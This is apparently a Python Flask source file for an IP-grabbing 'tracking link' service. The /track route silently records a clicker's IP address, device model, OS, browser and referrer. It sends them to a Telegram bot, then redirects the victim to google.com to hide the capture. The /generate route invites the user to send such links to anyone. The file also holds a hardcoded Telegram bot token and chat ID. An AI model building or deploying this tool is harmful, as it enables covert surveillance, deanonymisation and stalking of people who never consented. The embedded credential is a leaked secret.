from flask import Flask, request, redirect
import requests
import uuid
from datetime import datetime
from user_agents import parse
import re

app = Flask(__name__)

TOKEN = "8623908851:AAEa5zbK22wfIj2IezRFjz9CsrnNN02ab3Q"
CHAT_ID = 7591700804

@app.route('/track/<link_id>')
def track(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua_string = request.headers.get('User-Agent', '')
    referrer = request.headers.get('Referer')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ua = parse(ua_string)
    
    # Primary detection
    brand = ua.device.brand or ""
    model = ua.device.model or ""
    device_name = f"{brand} {model}".strip()

    # Improved regex for Indian/Chinese phones (Redmi, Realme, etc.)
    if not device_name or device_name == "Generic Android":
        patterns = [
            r'(Redmi|Xiaomi|Poco)[\s-]?([A-Za-z0-9]+)',
            r'(Realme|Oppo|Vivo)[\s-]?([A-Za-z0-9]+)',
            r'(Samsung)[\s-]?([A-Za-z0-9]+)',
            r'(OnePlus)[\s-]?([A-Za-z0-9]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, ua_string, re.I)
            if match:
                device_name = f"{match.group(1)} {match.group(2)}"
                break

    if not device_name:
        device_name = "Unknown Mobile"

    os = ua.os.family
    browser = ua.browser.family

    message = f"""🔥 New Click Detected!

🆔 Link ID: {link_id}
⏰ Time: {timestamp}
🌐 IP: {ip}
📱 Device: {device_name}
   OS: {os}
   Browser: {browser}
🔗 Referrer: {referrer or 'Direct'}"""

    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
        )
    except:
        pass

    return redirect("https://google.com", code=302)

@app.route('/generate')
def generate():
    link_id = str(uuid.uuid4())[:12]
    full_link = f"https://web-production-39eb45.up.railway.app/track/{link_id}"
    return f"✅ Your new tracking link:\n\n{full_link}\n\nSend this to anyone!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
